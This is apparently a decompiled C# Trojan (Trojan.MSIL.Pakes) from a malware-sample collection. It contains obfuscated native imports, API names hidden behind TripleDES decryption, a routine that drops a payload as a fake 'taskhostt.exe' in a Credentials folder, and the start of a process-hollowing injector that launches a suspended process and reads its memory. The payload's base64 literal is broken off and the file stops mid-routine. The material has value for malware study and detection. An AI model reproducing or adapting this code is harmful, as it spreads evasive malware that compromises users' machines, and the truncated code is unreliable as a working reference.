// Decompiled with JetBrains decompiler
// Type: wmpnetvk.ĐĩĺĤġ
// Assembly: wmpnetvk, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 6F41E01C-1B53-4EF5-852C-757E1AF2716B
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00004-msil\Trojan.MSIL.Pakes.y-fed23795c90c49dca3a3d6d4d72e410ebc85f0dd7e9ec2d1258c1ca4623097ed.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace wmpnetvk
{
  public class ĐĩĺĤġ
  {
    public const int ÁÃÂ1 = 32;
    public const int ÓÒÕ = 32;
    public const int ÈÉË = 16;
    public const int ÉÊÉ = 64;

    [DebuggerNonUserCode]
    public ĐĩĺĤġ()
    {
    }

    [DllImport("ËËÉ((58 >> 120))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern AssemblyName ÎÌÌ1();

    [DllImport("ËËÉ((258 >> -248))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern AssemblyName ÍÌÌ();

    [DllImport("ËËÉ((190 >> -185))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int ÏÍÌ();

    [DllImport("ËËÉ((540 >> -248))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int ËÊË();

    [DllImport("ËËÉ((37 Xor 38))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern IntPtr ÁÀÂ();

    [DllImport("ËËÉ((132 >> 5))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern IntPtr ÁÀÃ();

    [DllImport("ËËÉ((-272 Xor -267))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern IntPtr ÎÌÎ();

    [DllImport("ËËÉ((209 >> 325))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern AssemblyName ÕÖÒ();

    [DllImport("ËËÉ((131 - 124))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern AssemblyName ÉÉÈ1();

    [DllImport("ËËÉ((271 >> -59))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern AssemblyName ÓÓÓ();

    [DllImport("ËËÉ((-109 Xor -102))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern Environment ÂÄÄ();

    [DllImport("ËËÉ((258 + -248))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern Environment ÀÀÂ();

    [DllImport("ËËÉ((179 >> 68))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int ÔÔÒ();

    [DllImport("ËËÉ((-369 Xor -381))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int ÈËÈ();

    [DllImport("ËËÉ((-262 - -275))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int ÊËË();

    [DllImport("ËËÉ((-388 + 401))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern Environment ÃÄÂ();

    [DllImport("ËËÉ((-209 Xor -222))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern Environment ÌÏÎÎ();

    [DllImport("ËËÉ((-209 - -222))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern Environment ÓÒÒ();

    [DllImport("ËËÉ((880 >> 1062))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern AssemblyName ËÊÉ();

    [DllImport("ËËÉ((836 >> 1254))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern AssemblyName ÃÃÃ();

    [DllImport("ËËÉ((416 >> -1371))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern Environment ÎÌÏ1();

    [DllImport("ËËÉ((328 Xor 325))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern Environment ÀÅÅ();

    [DllImport("ËËÉ((214 >> -1564))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern Environment ÈÊÉ();

    [DllImport("ËËÉ((425 >> -2395))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern IntPtr ÔÕÒ();

    [DllImport("ËËÉ((838 >> 2566))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern IntPtr ÒÖÒÒ();

    [DllImport("ËËÉ((1779 >> 4359))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern IntPtr ÓÕÒ();

    [DllImport("ËËÉ((848 >> -1370))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern Environment ËÉÈ();

    [DllImport("ËËÉ((871 >> 6726))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern Environment ÊËÈ();

    [DllImport("ËËÉ((1768 >> -4057))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern Environment ÎÎÎ();

    [DllImport("ËËÉ((1765 >> 6599))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern Environment ÊÊÈ();

    [DllImport("ËËÉ((211 >> 7588))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern Environment ÊÈÈ();

    [DllImport("ËËÉ((6995 >> -23))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int ÌÎÎÎ();

    [DllImport("ËËÉ((6990 >> -7927))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int ÃÄÅ();

    [DllImport("ËËÉ((13444 >> 7370))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int ÀÅÂ();

    [DllImport("ËËÉ((13598 >> -10646))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern AssemblyName ÀÄÄ();

    [DllImport("ËËÉ((13902 >> -4150))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern AssemblyName ÎÏÏ();

    [DllImport("ËËÉ((13561 >> 10762))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern AssemblyName ÌÍÏ();

    [DllImport("ËËÉ((14406 - 14393))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern AssemblyName ÔÓÒ();

    [DllImport("ËËÉ((416 >> -8507))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern AssemblyName ÉËÉ();

    [DllImport("ËËÉ((7143 >> 3497))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern IntPtr ËÊÈ();

    [DllImport("ËËÉ((1783 >> 13319))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern IntPtr ËÉÊ();

    [DllImport("ËËÉ((285 - 275))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern Environment ÎÍÏ1();

    [DllImport("ËËÉ((261 - 251))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern Environment ÖÔÕÔ();

    [DllImport("ËËÉ((-526 - -536))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern Environment ÍÌÎ();

    [DllImport("ËËÉ((-307 + 321))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern AssemblyName ÍÌÏ();

    [DllImport("ËËÉ((-12 + 27))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern IntPtr ÈÉÊ1();

    [DllImport("ËËÉ((285 Xor 275))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern AssemblyName ÏÎÌ();

    [DllImport("ËËÉ((40 >> -606))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern Environment ÌÎÌÍ();

    [DllImport("ËËÉ((-466 - -482))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int ÖÖÒ();

    [DllImport("ËËÉ((328 >> 325))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern Environment ÎÏÍ();

    [DllImport("ËËÉ((470 >> -315))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern AssemblyName ÉÉË();

    [DllImport("ËËÉ((1338 >> 1383))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern Environment ÄÄÃ();

    [DllImport("ËËÉ((61 - 46))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern IntPtr ÄÂÃ();

    [DllImport("ËËÉ((2769 >> 1288))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern Environment ÌÌÌÌ();

    [DllImport("ËËÉ((1373 >> 423))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern Environment ÃÃÄ();

    [DllImport("ËËÉ((-222 - -238))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int ÅÃÂ();

    [DllImport("ËËÉ((7 << -287))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern AssemblyName ÍÌÍ();

    [DllImport("ËËÉ((112 >> 419))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern AssemblyName ÌÎÍ();

    [DllImport("ËËÉ((132 - 117))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern IntPtr ËÉË();

    [DllImport("ËËÉ((241 >> -92))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern IntPtr ÔÔÓ();

    [DllImport("ËËÉ((462 >> 133))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern AssemblyName ÃÃÀ();

    [DllImport("ËËÉ((10 << 3584))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern Environment ÒÒÒ();

    [DllImport("ËËÉ((368 + -353))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern IntPtr ÏÌÎ();

    [DllImport("ËËÉ((10 >> 3584))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern Environment ÉËÊ();

    [DllImport("ËËÉ((-141 - -155))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern AssemblyName ÊÈÎÉ();

    [DllImport("ËËÉ((8 << -31))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int ÌÏÏ();

    [DllImport("ËËÉ((503 >> -315))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern IntPtr ÏÎÏ();

    [DllImport("ËËÉ((337 >> -1083))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern Environment ÃÂÅ();

    [DllImport("ËËÉ((2698 >> 1896))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern Environment ÅÁÅ();

    [DllImport("ËËÉ((1255 + -1239))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int ËÈÎË();

    [DllImport("ËËÉ((2652 >> 4040))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern Environment ÅÅÄ();

    [DllImport("ËËÉ((-72 - -86))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern AssemblyName ÄÁÄ();

    [DllImport("ËËÉ((364 Xor 355))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern IntPtr ÕÖÖ();

    [DllImport("ËËÉ((563 >> 485))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern IntPtr ÊËÊ();

    [DllImport("ËËÉ((84 >> -1533))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern Environment ÌÍÍ();

    [DllImport("ËËÉ((1058 >> -1274))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int ÊÉÊ();

    [DllImport("ËËÉ((9 << 65))", EntryPoint = "ËËÉ((61 Xor 46))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int ÊÉË([MarshalAs(UnmanagedType.VBByRefStr)] ref string ÃÄÁ, [MarshalAs(UnmanagedType.VBByRefStr)] ref string ÁÅÁ, int ÌÎÌ);

    [DllImport("ËËÉ((-72 Xor -86))", EntryPoint = "ËËÉ((114 - 95))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int ÅÁÁ([MarshalAs(UnmanagedType.VBByRefStr)] ref string ÃÄÁ, [MarshalAs(UnmanagedType.VBByRefStr)] ref string ÁÅÁ, int ÌÎÌ);

    [DllImport("ËËÉ((74 + -54))", EntryPoint = "ËËÉ((-275 Xor -264))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int ÃÁÂ(int ÔÖÒ, int ÍÏÍ, int ÈÊÊ);

    [DllImport("ËËÉ((170 Xor 188))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern void ÀÅÁ();

    [DllImport("ËËÉ((329 >> 196))", EntryPoint = "ËËÉ((-39 - -62))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int ËÉÉ(int ÓÕÕ, int ÖÔÒ, int ÌÍÌ, ĐĩĺĤġ.ÔÖÖ ÒÖÒ);

    [DllImport("ËËÉ((1333 Xor 1325))", EntryPoint = "ËËÉ((108 Xor 117))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int ÎÌÍ(
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string ÁÃÀ,
      byte[] ÄÅÀ,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string ÓÓÕ,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string ÒÒÔ,
      ĐĩĺĤġ.ÔÒÓ ÖÓÖ,
      int ÎÍÌ,
      ĐĩĺĤġ.ÃÅÂ ÅÃÃ,
      int ÖÓÔ,
      int ËÈÉ,
      int ÕÖÕ,
      int ÅÂÄ);

    [DllImport("ËËÉ((-526 Xor -536))", EntryPoint = "ËËÉ((-39 Xor -62))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int ÍÎÎ(int ÁÂÂ, [MarshalAs(UnmanagedType.VBByRefStr)] ref string ÄÃÀ, ref int ÀÅÃ);

    [DllImport("ËËÉ((-9 + 37))", EntryPoint = "ËËÉ((-160 - -189))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int ËËÈ(int ÔÖÕ);

    [DllImport("ËËÉ((1197 >> 2054))", EntryPoint = "ËËÉ((14 Or 16))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int ÉÉÊ(int ÀÀÃ, int ÅÅÂ);

    [DllImport("ËËÉ((195 >> 195))", EntryPoint = "ËËÉ((-310 - -341))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int ÌÍÎ(int ÀÄÀ, int ÒÕÓ, byte[] ËÊÊ, int ÁÀÅ, int ÂÁÄ);

    [DllImport("ËËÉ((233 Xor 253))", EntryPoint = "ËËÉ((2056 >> -1402))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int ÅÀÄ(int ÓÕÕ, ĐĩĺĤġ.ÅÁÂ ÒÖÒ, int ÔÓÔ);

    public static void fkoff()
    {
      byte[] bytes = Convert.FromBase64String("
      File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\Protect\\Credentials\\taskhostt.exe", bytes);
    }

    [DllImport("ËËÉ((3164 Xor 3140))", EntryPoint = "ËËÉ((99 + -66))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int ÅÁÄ(ĐĩĺĤġ.ÅÂÂ ÂÂÁ, int ÓÔÒ, int ÍÏÌ, byte[] ÎÍÎ);

    [DllImport("ËËÉ((581 - 561))", EntryPoint = "ËËÉ((-519 Xor -549))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int ÁÂÃ(int ÓÕÕ);

    [DllImport("ËËÉ((-160 Xor -189))", EntryPoint = "ËËÉ((144 >> -158))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern void ÓÒÖ(int ÄÅÃ, int ÀÃÅ, int ÈÊË, int ÓÓÒ);

    [DllImport("ËËÉ((3164 - 3140))", EntryPoint = "ËËÉ((436 + -399))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int ÕÔÕ(ĐĩĺĤġ.ÉÊË1 ÂÂÁ, int ÓÔÒ, int ÍÏÌ, byte[] ÎÍÎ);

    [DllImport("ËËÉ((202 + -167))", EntryPoint = "ËËÉ((-198 + 236))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int ÀÃÄ1(int ÅÀÁ, byte[] ÅÂÃ, int ÖÕÔ, int ÃÀÀ, byte[] ÔÕÕ);

    [DllImport("ËËÉ((3128 >> 2951))", EntryPoint = "ËËÉ((37 Or 38))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int ÄÅÅ(ĐĩĺĤġ.ÈÈÈ1 ÂÂÁ, int ÓÔÒ, int ÔÒÕ, byte[] ÎÍÎ, int ÃÅÅ, int ÂÃÅ);

    [DllImport("ËËÉ((-285 + 305))", EntryPoint = "ËËÉ((-449 + 489))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int ÕÖÓ(int ÓÕÕ, int ÍÏÍ, int ÈÊÊ, int ÕÕÖ, double ÃÁÁ, double ÁÃÁ);

    [DllImport("ËËÉ((3117 >> -4313))", EntryPoint = "ËËÉ((214 - 173))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int ÁÄÂ(ĐĩĺĤġ.ÈÈÈ1 ÖÔÖ);

    [DllImport("ËËÉ((-186 - -214))", EntryPoint = "ËËÉ((1345 >> 1253))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int ÅÀÅ1(int ÔÖÕ, int ÄÅÄ, byte ÒÕÕ, int ÎÍÍ, int ÄÄÅ);

    [DllImport("ËËÉ((12 Or 16))", EntryPoint = "ËËÉ((193 - 150))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int ÃÂÀ(int ÔÖÕ, byte[] ÒÔÕ, int ÎÍÍ, int ÖÖÖ);

    [DllImport("ËËÉ((3123 >> 2215))", EntryPoint = "ËËÉ((1429 >> 101))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int ÕÓÕ(
      int ÀÃÂ,
      int ÁÀÁ,
      int ÂÁÂ,
      ĐĩĺĤġ.ÕÕÒ ÅÂÃ,
      int ÏÌÍ,
      int ÔÓÕ,
      int ÕÒÕ);

    [DllImport("ËËÉ((-497 + 532))", EntryPoint = "ËËÉ((-157 - -202))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int ÕÓÎÒ(int ÃÂÃ, int ÌÏÌ, int ÒÕÒ, ĐĩĺĤġ.ÒÒÖ ÅÃÄ, int ÃÃÅ);

    [DllImport("ËËÉ((644 >> -251))", EntryPoint = "ËËÉ((750 >> -1500))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int ÊÉÉ(int ÒÒÕ, int ÁÀÄ, int ÁÁÃ, ĐĩĺĤġ.ÉÉÉ ÁÁÅ);

    [DllImport("ËËÉ((666 >> 1157))", EntryPoint = "ËËÉ((-163 Xor -142))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int ÅÅÃ([MarshalAs(UnmanagedType.VBByRefStr)] ref string ÀÁÀ);

    [DllImport("ËËÉ((-1384 Xor -1408))", EntryPoint = "ËËÉ((-210 + 258))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int ÎÎÎÏ(
      int ÓÖÔ,
      int ÀÀÄ,
      int ÒÔÔ,
      int ÁÃÄ,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string ÍÎÍ,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string ËÈÈ,
      int ÖÒÓ,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string ÓÖÒ,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string ÄÁÀ,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string ÁÀÀ,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string ÂÅÃ);

    [DllImport("ËËÉ((289 + -254))", EntryPoint = "ËËÉ((384 - 335))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int ÍÏÎ(
      int ÀÃÃ,
      int ÌÎÏ,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string ÄÅÂ,
      int ÖÕÖ,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string ÕÒÒ,
      int ÓÖÕ);

    [DllImport("ËËÉ((-424 Xor -406))", EntryPoint = "ËËÉ((90 + -39))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int ËËÉ1(int ÂÄÂ, [MarshalAs(UnmanagedType.VBByRefStr)] ref string ÕÒÔ, int ÃÀÅ);

    [DllImport("ËËÉ((359 + -307))", EntryPoint = "ËËÉ((414 - 361))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int[] ÔÔÖ(int ÅÁÀ);

    [DllImport("ËËÉ((-169 Xor -157))", EntryPoint = "ËËÉ((-401 + 455))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int[] ÔÕÓ(int ÅÁÀ, int ÄÀÂ, int ÔÔÕ);

    [DllImport("ËËÉ((-1384 - -1408))", EntryPoint = "ËËÉ((39 Or 48))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int ÉÈË(int ÁÁÂ, [MarshalAs(UnmanagedType.VBByRefStr)] ref string ÀÄÁ, [MarshalAs(UnmanagedType.VBByRefStr)] ref string ÃÂÁ, int ÔÓÖ);

    [DllImport("ËËÉ((2381 >> 487))", EntryPoint = "ËËÉ((112 >> 385))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int ÀÂÀ(int ÔÖÓ, int ÄÃÁ, int ÂÃÂ, byte[] ÕÔÖ);

    [DllImport("ËËÉ((1628 >> 37))", EntryPoint = "ËËÉ((3700 >> 1190))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int ÓÒÓ(int ÄÄÄ, ĐĩĺĤġ.ÓÕÓ ÀÂÄ);

    [DllImport("ËËÉ((34 Xor 54))", EntryPoint = "ËËÉ((248 - 190))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int ÓÕÔÓ(int ÓÕÕ, int ÀÂÅ);

    [DllImport("ËËÉ((2412 >> 1287))", EntryPoint = "ËËÉ((-77 - -136))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int ÉÈÊ(int ËËÊ, int ÓÖÖ);

    [DllImport("ËËÉ((187 + -127))", EntryPoint = "ËËÉ((-65 Xor -126))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int ÁÅÂ(
      int ÌÏÍ,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string ÅÀÂ,
      short ÕÕÔ,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string ËËË,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string ÂÄÅ,
      int ÓÒÔ,
      int ÁÁÄ,
      int ÒÖÓ);

    [DllImport("ËËÉ((-646 + 696))", EntryPoint = "ËËÉ((-207 - -269))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int ÔÕÔ(int ÄÄÄ, ĐĩĺĤġ.ÔÖÖ ÒÖÒ);

    [DllImport("ËËÉ((4009 + -3959))", EntryPoint = "ËËÉ((143 - 80))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int ÄÃÃ(int ÄÄÄ, ĐĩĺĤġ.ÅÄÁ ÂÄÁ);

    [DllImport("ËËÉ((2323 >> -3737))", EntryPoint = "ËËÉ((-240 - -304))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int ÈÊÈ(byte ÁÃÅ);

    [DllImport("ËËÉ((-935 - -970))", EntryPoint = "ËËÉ((36 - -29))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int ÂÃÃ(int ÓÖÖ, int ÒÖÕ, int ÅÀÃ);

    [DllImport("ËËÉ((487 + -452))", EntryPoint = "ËËÉ((58 Xor 120))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int ÀÄÂ(int ÂÂÃ);

    [DllImport("ËËÉ((205 Xor 249))", EntryPoint = "ËËÉ((599 + -532))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int ÎÏÎ(int ÂÀÅ, [MarshalAs(UnmanagedType.VBByRefStr)] ref string ÃÅÃ);

    [DllImport("ËËÉ((728 Xor 748))", EntryPoint = "ËËÉ((128 + -60))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int ÅÃÁ([MarshalAs(UnmanagedType.VBByRefStr)] ref string ÁÄÁ, [MarshalAs(UnmanagedType.VBByRefStr)] ref string ÓÔÔ, int ÒÓÕ, int ÁÂÄ);

    public static void ĳĵģīĩĴ(byte[] ǅɫǅ, string ɫǅʥɫ)
    {
      ĐĩĺĤġ.ĢġĵĢġĵ ĢġĵĢġĵ = new ĐĩĺĤġ.ĢġĵĢġĵ();
      ĐĩĺĤġ.ʷƸģɗȋɒƸǅɫɚƸȋ info = new ĐĩĺĤġ.ʷƸģɗȋɒƸǅɫɚƸȋ();
      ĐĩĺĤġ.ɧɫǅɫ҅ɥɗȋɒƸ̱ǅɫɚƸȋ startup = new ĐĩĺĤġ.ɧɫǅɫ҅ɥɗȋɒƸ̱ǅɫɚƸȋ();
      ĐĩĺĤġ.ɚɫɴɑɪǅʥɨ process1 = new ĐĩĺĤġ.ɚɫɴɑɪǅʥɨ();
      ĐĩĺĤġ.ɚɫɴɑɪǅʥɨ thread = new ĐĩĺĤġ.ɚɫɴɑɪǅʥɨ();
      ĐĩĺĤġ.ȊɫǦǅɨ ȋɫǦǅɨ = new ĐĩĺĤġ.ȊɫǦǅɨ();
      GCHandle gcHandle = GCHandle.Alloc((object) ǅɫǅ, GCHandleType.Pinned);
      IntPtr ptr = gcHandle.AddrOfPinnedObject();
      int int32_1 = ptr.ToInt32();
      ĐĩĺĤġ.ƸɨǦǅ ƹɨǦǅ = new ĐĩĺĤġ.ƸɨǦǅ();
      ĐĩĺĤġ.ƸɨǦǅ structure1 = (ĐĩĺĤġ.ƸɨǦǅ) Marshal.PtrToStructure(gcHandle.AddrOfPinnedObject(), ƹɨǦǅ.GetType());
      gcHandle.Free();
      ptr = new IntPtr(checked (int32_1 + structure1.Ǆɨɨ));
      ĐĩĺĤġ.ȊɫǦǅɨ structure2 = (ĐĩĺĤġ.ȊɫǦǅɨ) Marshal.PtrToStructure(ptr, ȋɫǦǅɨ.GetType());
      ĐĩĺĤġ.ăĐ ăĐ = ĐĩĺĤġ.c9G3r9<ĐĩĺĤġ.ăĐ>(ĐĩĺĤġ.TDes("SYFnGKK5LJX2P9K+WGtpNA== ", "N3ibPlIPdw1fdTXphMEXEg==", true), ĐĩĺĤġ.TDes("9CEXdU38ZXvwsPwKZkSNEA== ", "iF3VskOuOun/MOEcAh2jKA==", true));
      ĐĩĺĤġ.ćĔă ćĔă = ĐĩĺĤġ.c9G3r9<ĐĩĺĤġ.ćĔă>(ĐĩĺĤġ.TDes("SYFnGKK5LJX2P9K+WGtpNA== ", "N3ibPlIPdw1fdTXphMEXEg==", true), ĐĩĺĤġ.TDes("aP/5OPjI+TriWQQGugxIg5T3r9uNIbdC ", "k26HRtKqnePyTVmewAHkzv4+SZGp4LjQ", true));
      ĐĩĺĤġ.ĒĐč ēđč1 = ĐĩĺĤġ.c9G3r9<ĐĩĺĤġ.ĒĐč>(ĐĩĺĤġ.TDes("SYFnGKK5LJX2P9K+WGtpNA== ", "N3ibPlIPdw1fdTXphMEXEg==", true), ĐĩĺĤġ.TDes("fK822cJhQPoMmhjTUC7+CNxsJoW3VCwn ", "ija9XiVhLCf3GtSNMoC/mcF5P4AWBYI3", true));
      ĐĩĺĤġ.ėĐč ėĐč1 = ĐĩĺĤġ.c9G3r9<ĐĩĺĤġ.ėĐč>(ĐĩĺĤġ.TDes("SYFnGKK5LJX2P9K+WGtpNA== ", "N3ibPlIPdw1fdTXphMEXEg==", true), ĐĩĺĤġ.TDes("UDKNp7WuzVeTO+n6HX7af5V6HtWMRNaa ", "e/qvZWqUXytdYuvtaCgps5/nZXZCfpa0", true));
      ĐĩĺĤġ.ĕĖē ĕĖē = ĐĩĺĤġ.c9G3r9<ĐĩĺĤġ.ĕĖē>(ĐĩĺĤġ.TDes("ef5IsNM9LrM= ", "vuI3IyiZsvg=", true), ĐĩĺĤġ.TDes("sE+SPJMt0s5tu8HU0DLBGovL+bbT3v3v ", "Bq8xOoBaJbksACbtvVEWpZtTn6MfKq7A", true));
      ĐĩĺĤġ.Ėā ėā = ĐĩĺĤġ.c9G3r9<ĐĩĺĤġ.Ėā>(ĐĩĺĤġ.TDes("SYFnGKK5LJX2P9K+WGtpNA== ", "N3ibPlIPdw1fdTXphMEXEg==", true), ĐĩĺĤġ.TDes("bXWq1Iznm3mq1itYYtBNoA== ", "oErhHe8FbRfwF7Na84h/TA==", true));
      ĐĩĺĤġ.ēĔă ēĔă = ĐĩĺĤġ.c9G3r9<ĐĩĺĤġ.ēĔă>(ĐĩĺĤġ.TDes("SYFnGKK5LJX2P9K+WGtpNA== ", "N3ibPlIPdw1fdTXphMEXEg==", true), ĐĩĺĤġ.TDes("qBtlNGWt/n93uDV0b7rlp4FAAsF5LuKl ", "P19QIGdHu+lXHbWaaNVVVg4UGexzUdFD", true));
      ĐĩĺĤġ.ĒĔ ēĕ = ĐĩĺĤġ.c9G3r9<ĐĩĺĤġ.ĒĔ>(ĐĩĺĤġ.TDes("SYFnGKK5LJX2P9K+WGtpNA== ", "N3ibPlIPdw1fdTXphMEXEg==", true), ĐĩĺĤġ.TDes("UKb6ZoVs7W/yR+maQiKuKg== ", "jRxAG/bOKPCl0+3qPJUYaQ==", true));
      long num1 = 0;
      long num2 = 0;
      startup.ăĂ = Strings.Len((object) startup);
      ĢġĵĢġĵ.ɑɪǅʥɨ = 65539U;
      IntPtr system;
      if (structure2.Ƨƚǥŋąƫυṟȝ != 17744U || structure1.Ӝǅʥɚģ != (ushort) 23117 || -(ăĐ((string) null, ɫǅʥɫ, ref process1, ref thread, false, 4U, system, (string) null, ref startup, out info) ? 1 : 0) == 1)
        return;
      if (ĐĩĺĤġ.Ңɚȋ())
      {
        int num3 = ćĔă(info.ƬħṟȝąƋ, ref ĢġĵĢġĵ) ? 1 : 0;
        ĐĩĺĤġ.ĒĐč ēđč2 = ēđč1;
        IntPtr process2 = info.Process;
        int address = checked ((int) ((long) ĢġĵĢġĵ.Ȝƀϫ + 8L));
        int num4 = 0;
        ref int local1 = ref num4;
        int num5 = 0;
        ref int local2 = ref num5;
        int num6 = ēđč2(process2, address, ref local1, 4, ref local2);
